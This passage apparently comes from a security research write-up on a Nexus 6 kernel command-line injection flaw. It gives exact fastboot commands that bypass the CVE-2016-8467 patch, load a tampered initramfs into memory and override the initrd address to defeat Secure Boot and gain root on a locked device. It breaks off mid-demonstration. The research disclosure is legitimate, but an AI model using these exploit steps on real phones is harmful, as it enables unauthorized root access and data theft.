<h2 id="immediate-result-bypassing-cve-2016-8467s-patch">Immediate Result: Bypassing CVE-2016-8467’s Patch</h2>
<p>At this point, bypassing <span class="cve-high" title="Google Nexus 6/6P Custom Boot Modes USB Configs Override"><a href="https://alephsecurity.com/vulns/aleph-2016002">CVE-2016-8467</a></span>’s patch is trivial:</p>
<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ fastboot oem config console "a androidboot.mode=bp-tools "
[...]
(bootloader) <span class="nt">&lt;UTAG</span> <span class="na">name=</span><span class="s">"conolse"</span> <span class="na">type=</span><span class="s">"str"</span> <span class="na">protected=</span><span class="s">"false"</span><span class="nt">&gt;</span>
(bootloader)   <span class="nt">&lt;value&gt;</span>
(bootloader)     a androidboot.mode=bp-tools
(bootloader)   <span class="nt">&lt;/value&gt;</span>
(bootloader)   <span class="nt">&lt;description&gt;</span>
(bootloader)     Carrier IDs, see <a class="vglnk" href="http://goo.gl/lojLh3" rel="nofollow"><span>http</span><span>://</span><span>goo</span><span>.</span><span>gl</span><span>/</span><span>lojLh3</span></a>
(bootloader)   <span class="nt">&lt;/description&gt;</span>
(bootloader) <span class="nt">&lt;/UTAG&gt;</span>
[...]
</code></pre></div></div>
<p>And indeed:</p>
<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">shamu:/ $</span><span class="w"> </span>getprop ro.boot.mode
<span class="go">bp-tools
</span><span class="gp">shamu:/ $</span><span class="w">
</span></code></pre></div></div>
<p>Please note that we must change the <code class="language-plaintext highlighter-rouge">console</code> parameter in order to beat the real <code class="language-plaintext highlighter-rouge">androidboot.mode</code> arg that is inserted by the bootloader. (Code that handles the kernel cmdline for the <code class="language-plaintext highlighter-rouge">init</code> process is under <code class="language-plaintext highlighter-rouge">core/init/init.cpp!import_kernel_nv</code>.)</p>
<p>But can we do anything beyond changing the bootmode, by inserting arbitrary args into the command line?</p>
<h2 id="a-whole-new-attack-surface">A Whole New Attack Surface</h2>
<p>The kernel command line is consumed by several entities across the OS, including:</p>
<ol>
<li>In kernel code, through the <code class="language-plaintext highlighter-rouge">__setup</code> macro.</li>
<li>In kernel code, through the <code class="language-plaintext highlighter-rouge">early_param</code> macro.</li>
<li>In kernel modules code, through the <code class="language-plaintext highlighter-rouge">module_param*</code> macros.</li>
<li>In kernel modules codes, through the <code class="language-plaintext highlighter-rouge">core_param</code> macro.</li>
<li>In user space (e.g. <code class="language-plaintext highlighter-rouge">init</code>, see above).</li>
</ol>
<p>There are dozens if not hundreds of usages of these macros – any feature or bug introduced by controlling them could be exploited. We will now see that being able to control a single argument allowed us the defeat Secure Boot.</p>
<h2 id="secure-boot-in-nexus-6">Secure Boot in Nexus 6</h2>
<p>The boot process of Qualcomm MSM devices (such as Motorola Nexus 6) is (much briefly!) as follows:</p>
<div class="highlighter-rouge"><pre class="highlight"><code><span class="nc">[Primary Bootloader (PBL)]</span>
`-.
  <span class="nc">[Secondary Bootloader (SBL)]</span>
   `-.
     <span class="nc">[Applications Bootloader (ABOOT)]</span>
     `-.      
       <span class="nc">[{boot,recovery}.img]</span>
       |-- <span class="nc">Linux Kernel</span>
       `-- <span class="nc">initramfs</span>
           `-.
             <span class="nc">[system.img]</span>
</code></pre>
</div>
<p>The <code class="language-plaintext highlighter-rouge">PBL</code> kicks-in from ROM when the device is powered on. It then loads the digitally-signed <code class="language-plaintext highlighter-rouge">SBL</code> to memory, and verifies its authenticity. The <code class="language-plaintext highlighter-rouge">SBL</code> loads the digital-signed <code class="language-plaintext highlighter-rouge">ABOOT</code> (which implements the <code class="language-plaintext highlighter-rouge">fastboot</code> interface), and again verifies its authenticity. The signed certificates of the <code class="language-plaintext highlighter-rouge">SBL</code> and <code class="language-plaintext highlighter-rouge">ABOOT</code> have a root certificate anchored in hardware.</p>
<p><code class="language-plaintext highlighter-rouge">ABOOT</code> then verifies the authenticity of the <code class="language-plaintext highlighter-rouge">boot</code> or <code class="language-plaintext highlighter-rouge">recovery</code> images, loads the Linux kernel and <code class="language-plaintext highlighter-rouge">initramfs</code> from the boot or recovery images at fixed physical addresses (<code class="language-plaintext highlighter-rouge">0x8000</code> &amp; <code class="language-plaintext highlighter-rouge">0x2000000</code> in Nexus 6). <code class="language-plaintext highlighter-rouge">initramfs</code> is a <code class="language-plaintext highlighter-rouge">cpio</code> (gzipped) archive that gets loaded into <code class="language-plaintext highlighter-rouge">rootfs</code> (a RAM filesystem mounted at <code class="language-plaintext highlighter-rouge">/</code>) during the Linux kernel initialization. It contains the <code class="language-plaintext highlighter-rouge">init</code> binary, the first users pace process.</p>
<p>The bootloader (<code class="language-plaintext highlighter-rouge">ABOOT</code>) prepares the kernel command line and <code class="language-plaintext highlighter-rouge">initramfs</code> parameters for the Linux kernel in the Device Tree Blob (<code class="language-plaintext highlighter-rouge">DTB</code>) located at physical address <code class="language-plaintext highlighter-rouge">0x1e00000</code>. One can confirm that by dumping the in-memory <code class="language-plaintext highlighter-rouge">DTB</code> to disk, and then parse it with <code class="language-plaintext highlighter-rouge">fdtdump</code>:</p>
<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
linux,initrd-end = <span class="err">&lt;</span>0x02172814&gt;;
linux,initrd-start = <span class="err">&lt;</span>0x02000000&gt;;
bootargs = "console=ttyHSL0,115200,n8 earlyprintk androidboot.console=ttyHSL0 androidboot.hardware=shamu msm_rtb.filter=0x37 ehci-hcd.park=3 
utags.blkdev=/dev/block/platform/msm_sdcc.1/by-name/utags utags.backup=/dev/block/platform/msm_sdcc.1/by-name/utagsBackup coherent_pool=8M 
vmalloc=300M buildvariant=userdebug androidboot.bootdevice=msm_sdcc.1 androidboot.serialno=ZX1G427V97 androidboot.baseband=mdm
[...]
</code></pre></div></div>
<p>The bootloader then transfers execution to the Linux kernel.</p>
<h2 id="linux-kernel-initialization-from-aboot-to-init-in-a-nutshell">Linux Kernel Initialization: From ABOOT to init in a Nutshell</h2>
<p>The Linux kernel function that parses the parameters given by <code class="language-plaintext highlighter-rouge">ABOOT</code> in the <code class="language-plaintext highlighter-rouge">DTB</code> is <code class="language-plaintext highlighter-rouge">early_init_dt_scan_chosen</code>. In <code class="language-plaintext highlighter-rouge">arm</code> kernels, it eventually calls this specific function:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">__init</span> <span class="nf">early_init_dt_setup_initrd_arch</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">start</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">end</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">phys_initrd_start</span> <span class="o">=</span> <span class="n">start</span><span class="p">;</span>
	<span class="n">phys_initrd_size</span> <span class="o">=</span> <span class="n">end</span> <span class="o">-</span> <span class="n">start</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Physical memory addressed by <code class="language-plaintext highlighter-rouge">phys_initrd_start</code> is then mapped into the virtual address space by the following code:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">__init</span> <span class="nf">arm_memblock_init</span><span class="p">(</span><span class="k">struct</span> <span class="n">meminfo</span> <span class="o">*</span><span class="n">mi</span><span class="p">,</span> <span class="k">struct</span> <span class="n">machine_desc</span> <span class="o">*</span><span class="n">mdesc</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">[...]</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">phys_initrd_size</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">memblock_reserve</span><span class="p">(</span><span class="n">phys_initrd_start</span><span class="p">,</span> <span class="n">phys_initrd_size</span><span class="p">);</span>

		<span class="cm">/* Now convert initrd to virtual addresses */</span>
		<span class="n">initrd_start</span> <span class="o">=</span> <span class="n">__phys_to_virt</span><span class="p">(</span><span class="n">phys_initrd_start</span><span class="p">);</span>
		<span class="n">initrd_end</span> <span class="o">=</span> <span class="n">initrd_start</span> <span class="o">+</span> <span class="n">phys_initrd_size</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">[...]</span>
<span class="p">}</span>
</code></pre></div></div>
<p>The <code class="language-plaintext highlighter-rouge">initramfs</code> is unpacked to <code class="language-plaintext highlighter-rouge">rootfs</code> next:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">populate_initramfs</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">[...]</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">initrd_start</span><span class="p">)</span> <span class="p">{</span>
<span class="cp">#ifdef CONFIG_BLK_DEV_RAM
</span>		<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>    
		<span class="n">err</span> <span class="o">=</span> <span class="n">unpack_to_initramfs</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">initrd_start</span><span class="p">,</span>
			<span class="n">initrd_end</span> <span class="o">-</span> <span class="n">initrd_start</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">free_initrd</span><span class="p">();</span>
			<span class="k">goto</span> <span class="n">done</span><span class="p">;</span>
		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
			<span class="n">clean_initramfs</span><span class="p">();</span>
			<span class="n">unpack_to_initramfs</span><span class="p">(</span><span class="n">__initramfs_start</span><span class="p">,</span> <span class="n">__initramfs_size</span><span class="p">);</span>
		<span class="p">}</span>
<span class="p">[...]</span>
   <span class="p">}</span>
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">initramfs_initcall</span><span class="p">(</span><span class="n">populate_initramfs</span><span class="p">);</span>
</code></pre></div></div>
<p>Eventually the <code class="language-plaintext highlighter-rouge">kernel_init</code> function is called, which executes the first userspace process: <code class="language-plaintext highlighter-rouge">/init</code>.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="n">__ref</span> <span class="nf">kernel_init</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">unused</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">[...]</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ramdisk_execute_command</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">run_init_process</span><span class="p">(</span><span class="n">ramdisk_execute_command</span><span class="p">))</span>
			<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
		<span class="n">pr_err</span><span class="p">(</span><span class="s">"Failed to execute %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ramdisk_execute_command</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">[...]</span>
<span class="p">}</span>
</code></pre></div></div>
<p>(<code class="language-plaintext highlighter-rouge">ramdisk_execute_command</code> has a default value of <code class="language-plaintext highlighter-rouge">/init</code>.)</p>
<h2 id="initializing-userspace--dm-verity">Initializing userspace &amp; dm-verity</h2>
<p><code class="language-plaintext highlighter-rouge">init</code> is in charge of bringing up the user space. Among its duties, is setting up SELinux (load its policies, etc). Once the policies are loaded, it will be in the <code class="language-plaintext highlighter-rouge">kernel</code> domain, but soon after the SELinux initialization code completes, it transfers itself to the <code class="language-plaintext highlighter-rouge">init</code> domain. Please note that on production builds, even if the kernel is loaded with non-<code class="language-plaintext highlighter-rouge">enforcing</code> SELinux (which can be done, for example, by appending <code class="language-plaintext highlighter-rouge">androidboot.selinux=permissive</code> to the kernel command line), <code class="language-plaintext highlighter-rouge">init</code> will re-enforce:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">selinux_initialize</span><span class="p">(</span><span class="n">bool</span> <span class="n">in_kernel_domain</span><span class="p">)</span> <span class="p">{</span>
<span class="p">[...]</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">in_kernel_domain</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">INFO</span><span class="p">(</span><span class="s">"Loading SELinux policy...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">[...]</span>
        <span class="n">bool</span> <span class="n">kernel_enforcing</span> <span class="o">=</span> <span class="p">(</span><span class="n">security_getenforce</span><span class="p">()</span> <span class="o">==</span> <span class="mi">1</span><span class="p">);</span>
        <span class="n">bool</span> <span class="n">is_enforcing</span> <span class="o">=</span> <span class="n">selinux_is_enforcing</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">kernel_enforcing</span> <span class="o">!=</span> <span class="n">is_enforcing</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">security_setenforce</span><span class="p">(</span><span class="n">is_enforcing</span><span class="p">))</span> <span class="p">{</span>
                <span class="n">ERROR</span><span class="p">(</span><span class="s">"security_setenforce(%s) failed: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
                      <span class="n">is_enforcing</span> <span class="o">?</span> <span class="s">"true"</span> <span class="o">:</span> <span class="s">"false"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
                <span class="n">security_failure</span><span class="p">();</span>
            <span class="p">}</span>
        <span class="p">}</span>
<span class="p">[...]</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>
<p>(on production builds, <code class="language-plaintext highlighter-rouge">selinux_is_enforce()</code> always returns <code class="language-plaintext highlighter-rouge">true</code>.).</p>
<p><code class="language-plaintext highlighter-rouge">init</code> also triggers the partition mounts. <code class="language-plaintext highlighter-rouge">dm-verity</code> later verifies the integrity of relevant partitions (e.g. <code class="language-plaintext highlighter-rouge">system</code>) with a public key stored under the <code class="language-plaintext highlighter-rouge">initramfs</code> (<code class="language-plaintext highlighter-rouge">/verity_key</code>) – an untrusted <code class="language-plaintext highlighter-rouge">initramfs</code> means an untrusted <code class="language-plaintext highlighter-rouge">system</code> partition.</p>
<p>So how can the attacker interfere with the described boot process, given the Kernel Command-line Injection Vulnerability?</p>
<h2 id="failed-attempt-controlling-ramdisk_execute_command">Failed Attempt: Controlling ramdisk_execute_command</h2>
<p>It turns out that there is a kernel command line argument <code class="language-plaintext highlighter-rouge">rdinit</code> that overrides <code class="language-plaintext highlighter-rouge">/init</code>, the default value of <code class="language-plaintext highlighter-rouge">ramdisk_execute_command</code>:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">rdinit_setup</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>

	<span class="n">ramdisk_execute_command</span> <span class="o">=</span> <span class="n">str</span><span class="p">;</span>
	<span class="cm">/* See "auto" comment in init_setup */</span>
	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAX_INIT_ARGS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
		<span class="n">argv_init</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">__setup</span><span class="p">(</span><span class="s">"rdinit="</span><span class="p">,</span> <span class="n">rdinit_setup</span><span class="p">);</span>
</code></pre></div></div>
<p>That looked promising, by exploiting our vulnerability we could cause the kernel to execute an arbitrary user space process, e.g. <code class="language-plaintext highlighter-rouge">fastboot oem config carrier "a rdinit=/sbin/foo"</code>.
The main challenge we encountered which made controlling <code class="language-plaintext highlighter-rouge">rdinit</code> ineffective was the fact that the Nexus 6 <code class="language-plaintext highlighter-rouge">initramfs</code> contains a very limited set of binaries:</p>
<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> sbin
<span class="go">adbd  healthd  slideshow ueventd  watchdogd
</span></code></pre></div></div>
<p>Even if one of them could have some potential (e.g. <code class="language-plaintext highlighter-rouge">adbd</code>), user space at that point of execution is uninitialized, hence they may fail due to dependencies which they rely on that are not satisfied. Given the rather big attack surface described above, we decided to move along to the next command line argument we could control, however further analysis of these binaries may prove they are useful.</p>
<h2 id="controlling-the-initramfs-physical-loading-address">Controlling the initramfs Physical Loading Address</h2>
<p>Interestingly, we’ve realized that in <code class="language-plaintext highlighter-rouge">arm</code>, it is also possible to control, through a kernel command line argument <code class="language-plaintext highlighter-rouge">initrd</code>, the physical address where the <code class="language-plaintext highlighter-rouge">initramfs</code> is loaded from by the kernel!</p>
<p>Under <code class="language-plaintext highlighter-rouge">arch/arm/mm/init.c</code>:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">early_initrd</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">start</span><span class="p">,</span> <span class="n">size</span><span class="p">;</span>
	<span class="kt">char</span> <span class="o">*</span><span class="n">endp</span><span class="p">;</span>

	<span class="n">start</span> <span class="o">=</span> <span class="n">memparse</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">endp</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">endp</span> <span class="o">==</span> <span class="sc">','</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">size</span> <span class="o">=</span> <span class="n">memparse</span><span class="p">(</span><span class="n">endp</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

		<span class="n">phys_initrd_start</span> <span class="o">=</span> <span class="n">start</span><span class="p">;</span>
		<span class="n">phys_initrd_size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">early_param</span><span class="p">(</span><span class="s">"initrd"</span><span class="p">,</span> <span class="n">early_initrd</span><span class="p">);</span>
</code></pre></div></div>
<p>This overrides the default values provided by <code class="language-plaintext highlighter-rouge">ABOOT</code> in the <code class="language-plaintext highlighter-rouge">DTB</code>. We then tested it with a random value, expecting the Kernel to crash:</p>
<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>fastboot oem config fsg-id <span class="s2">"a initrd=0x33333333,1024"</span>
<span class="go">[...]
</span><span class="gp">(bootloader) &lt;UTAG name="fsg-id" type="str" protected="false"&gt;</span><span class="w">
</span><span class="gp">(bootloader)   &lt;value&gt;</span><span class="w">
</span><span class="go">(bootloader)     a initrd=0x33333333,1024
</span><span class="gp">(bootloader)   &lt;/value&gt;</span><span class="w">
</span><span class="gp">(bootloader)   &lt;description&gt;</span><span class="w">
</span><span class="go">(bootloader)     FSG IDs, see <a class="vglnk" href="http://goo.gl/gPmhU" rel="nofollow"><span>http</span><span>://</span><span>goo</span><span>.</span><span>gl</span><span>/</span><span>gPmhU</span></a>
</span><span class="gp">(bootloader)   &lt;/description&gt;</span><span class="w">
</span><span class="gp">(bootloader) &lt;/UTAG&gt;</span><span class="w">
</span><span class="go">
OKAY [  0.016s]
finished. total time: 0.016s

</span><span class="gp">$</span><span class="w"> </span>fastboot <span class="k">continue</span>
</code></pre></div></div>
<p>It indeed crashed!</p>
<p>This kind of attack is analogous to controlling the Instruction Pointer (<code class="language-plaintext highlighter-rouge">IP</code> register) or Program Counter (<code class="language-plaintext highlighter-rouge">PC</code> register) in memory corruption bugs, so the first order of business in this case would be loading our own tampered <code class="language-plaintext highlighter-rouge">initramfs</code> archive to the device’s memory, through <code class="language-plaintext highlighter-rouge">fastboot</code>.</p>
<p>Note that the Linux Kernel does not re-verify the authenticity of <code class="language-plaintext highlighter-rouge">initramfs</code>, it relies on the bootloader to do that, so if we manage to put a tampered <code class="language-plaintext highlighter-rouge">initramfs</code> at the controlled <code class="language-plaintext highlighter-rouge">phys_initrd_start</code> physical address, the kernel will indeed populate it into <code class="language-plaintext highlighter-rouge">rootfs</code>.</p>
<h2 id="loading-arbitrary-data-to-memory-through-usb">Loading Arbitrary Data to Memory through USB</h2>
<p><code class="language-plaintext highlighter-rouge">ABOOT</code>’s <code class="language-plaintext highlighter-rouge">fastboot</code> provides a download mechanism via USB, which supports features such as flashing. The download functionality is available even on locked bootloaders, therefore the attacker can use this feature in order to load a tampered <code class="language-plaintext highlighter-rouge">initramfs</code> on the device. Our only hope is that the bootloader nor the kernel zero-out/override that data before <code class="language-plaintext highlighter-rouge">initramfs</code> is populated into <code class="language-plaintext highlighter-rouge">rootfs</code>. In order to verify that, we made the following experiment. First, we installed our own <code class="language-plaintext highlighter-rouge">msm-shamu</code> kernel with Loadable-Kernel Modules (LKM) support. We then uploaded to the device a large blob <code class="language-plaintext highlighter-rouge">0123456789ABCDEFALEFALEFALEF...</code> via <code class="language-plaintext highlighter-rouge">fastboot</code>:</p>
<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>fastboot flash aleph payload.bin
<span class="go">[...]
target reported max download size of 536870912 bytes
sending 'aleph' (524288 KB)...
OKAY [ 62.610s]
writing 'aleph'...
(bootloader) Not allowed in LOCKED state!
FAILED (remote failure)
finished. total time: 62.630s
</span></code></pre></div></div>
<p>Please note that the failure message is due to the flashing attempt, however, the data is downloaded by device anyway.</p>
<p>We booted the platform with <code class="language-plaintext highlighter-rouge">fastboot continue</code>, and then dumped the whole physical memory with the <a href="https://github.com/504ensicsLabs/LiME"><code class="language-plaintext highlighter-rouge">LiME</code> LKM</a> (a great tool!), searching for our blob:</p>
<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10FFFFC0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
10FFFFD0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
10FFFFE0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
10FFFFF0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
11000000  30 31 32 33 34 35 36 37 38 39 41 42 43 44 45 46  0123456789ABCDEF
11000010  41 4C 45 46 41 4C 45 46 41 4C 45 46 41 4C 45 46  ALEFALEFALEFALEF
11000020  41 4C 45 46 41 4C 45 46 41 4C 45 46 41 4C 45 46  ALEFALEFALEFALEF
11000030  41 4C 45 46 41 4C 45 46 41 4C 45 46 41 4C 45 46  ALEFALEFALEFALEF
11000040  41 4C 45 46 41 4C 45 46 41 4C 45 46 41 4C 45 46  ALEFALEFALEFALEF
11000050  41 4C 45 46 41 4C 45 46 41 4C 45 46 41 4C 45 46  ALEFALEFALEFALEF
</span></code></pre></div></div>
<p>This has given us a stronger guarantee because our payload survived even when the platform is up and running. We’ve repeated this process several times, there was nothing random – the payload is always loaded at <code class="language-plaintext highlighter-rouge">0x11000000</code> and is available for the Linux Kernel!</p>
<p>For the sake of curiosity we’ve also statically verified this result. It turns out that Little Kernel (LK), which the Nexus 6 is based on, has a memory area pointed by <code class="language-plaintext highlighter-rouge">SCRATCH_ADDR</code> where the downloaded data is saved under. Loading the <code class="language-plaintext highlighter-rouge">ABOOT</code> binary with <code class="language-plaintext highlighter-rouge">IDA</code> confirms (functions renamed for readability):</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">fastboot_mode</span><span class="p">()</span>
<span class="p">{</span>
<span class="p">[...]</span>
  <span class="n">dprintf</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"Entering fastboot mode</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">[...]</span>
  <span class="n">v8</span> <span class="o">=</span> <span class="n">return11000000</span><span class="p">();</span>
  <span class="n">v9</span> <span class="o">=</span> <span class="n">return20000000</span><span class="p">();</span>
  <span class="n">fastboot_init</span><span class="p">(</span><span class="n">v8</span><span class="p">,</span> <span class="n">v9</span><span class="p">);</span>
  <span class="n">v11</span> <span class="o">=</span> <span class="n">sub_FF2EA94</span><span class="p">(</span><span class="n">v10</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v13</span> <span class="o">!=</span> <span class="n">v10021C84</span> <span class="p">)</span>
    <span class="n">sub_FF3D784</span><span class="p">();</span>
  <span class="k">return</span> <span class="n">sub_FF15BA4</span><span class="p">(</span><span class="n">v11</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">signed</span> <span class="kt">int</span> <span class="nf">return11000000</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// r0@1</span>

  <span class="n">result</span> <span class="o">=</span> <span class="mh">0x11000000</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v10021C84</span> <span class="o">!=</span> <span class="n">v10021C84</span> <span class="p">)</span>
    <span class="n">sub_FF3D784</span><span class="p">();</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>This value is eventually consumed by the download handler of <code class="language-plaintext highlighter-rouge">ABOOT</code>.</p>
<p>To conclude, we have the following physical memory layout before the <code class="language-plaintext highlighter-rouge">initramfs</code> archive is populated from memory into <code class="language-plaintext highlighter-rouge">rootfs</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.-------------------.------------------------------.-----------.
| Physical Address  | What                         | Loaded by |
|-------------------|------------------------------|-----------|
| 0x00008000        | Linux Kernel                 | ABOOT     |
| 0x01E00000        | Device Tree Blob (DTB)       | ABOOT     |
| 0x02000000        | Verified initramfs           | ABOOT     |
| 0x11000000        | Tampered initramfs (payload) | Adversary |
`-------------------'------------------------------'-----------'
</code></pre></div></div>
<p>We are now all done, we can now place our <code class="language-plaintext highlighter-rouge">initramfs</code> at a fixed physical address and then instruct the kernel to populate it.</p>
<h2 id="creating-a-malicious-initramfs">Creating a Malicious initramfs</h2>
<p>The final step is to create our own malicious <code class="language-plaintext highlighter-rouge">initramfs</code>. One can just compile a <code class="language-plaintext highlighter-rouge">userdebug</code> AOSP boot image and rip the <code class="language-plaintext highlighter-rouge">initramfs.cpio.gz</code> file out of it, since it contains the <code class="language-plaintext highlighter-rouge">su</code> domain and a root-capable <code class="language-plaintext highlighter-rouge">adbd</code>. The only caveat is <code class="language-plaintext highlighter-rouge">dm-verity</code> which will not be able to verify the official <code class="language-plaintext highlighter-rouge">system</code> partition (because the AOSP boot image will contain the debug <code class="language-plaintext highlighter-rouge">verity_key</code>). Anyway, since we are now able to load a malicious <code class="language-plaintext highlighter-rouge">initramfs</code>, this annoyance can be bypassed easily by editing the <code class="language-plaintext highlighter-rouge">fstab</code> file (removing the verification), or replacing the debug <code class="language-plaintext highlighter-rouge">verity_key</code> with the official one from the relevant build.</p>
<p>A Proof-of-Concept <code class="language-plaintext highlighter-rouge">initramfs</code> is <a href="https://github.com/alephsecurity/initroot">available in our GitHub research repo</a>.</p>
<h2 id="putting-it-all-together-got-root">Putting it All Together: got root!</h2>
<p>We now have everything we need:</p>
<ol>
<li>We have a malicious <code class="language-plaintext highlighter-rouge">initramfs</code> archive.</li>
<li>We can load it into memory at a fixed physical address using the bootloader <code class="language-plaintext highlighter-rouge">fastboot</code> interface.</li>
<li>We can instruct the Linux kernel to populate it from that address.</li>
</ol>
<p>In terms of Secure Boot, we now have the following broken chain-of-(dis)trust:</p>
<div class="highlighter-rouge"><pre class="highlight"><code><span class="nc">[Primary Bootloader (PBL)]</span>
`-.
  <span class="nc">[Secondary Bootloader (SBL)]</span>
   `-.
     <span class="nc">[Applications Bootloader (ABOOT)]</span>
     `-.      
       <span class="nc">[{boot,recovery}.img]</span>
       |-- <span class="nc">Linux Kernel</span>
       `-- <span class="rd">initramfs &lt;- Controlled by Attacker in Memory</span>
           `-.
             <span class="rd">[system.img] &lt;- Cannot be Trusted</span>
</code></pre>
</div>
<p>The following shows a successful attack:</p>
<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>adb shell
<span class="gp">shamu:/ $</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:shell:s0
</span><span class="gp">shamu:/ $</span><span class="w"> </span>getenforce
<span class="go">Enforcing
</span><span class="gp">shamu:/ $</span><span class="w"> </span>setenforce permissive
<span class="go">setenforce: Couldn't set enforcing status to 'permissive': Permission denied
</span><span class="gp">shamu:/ $</span><span class="w"> </span>reboot bootloader
<span class="go">
</span><span class="gp">$</span><span class="w"> </span>fastboot getvar unlocked
<span class="go">[...]
unlocked: no
finished. total time: 0.008s

</span><span class="gp">$</span><span class="w"> </span>fastboot oem config fsg-id <span class="s2">"a initrd=0x11000000,1518172"</span>
<span class="go">[...]
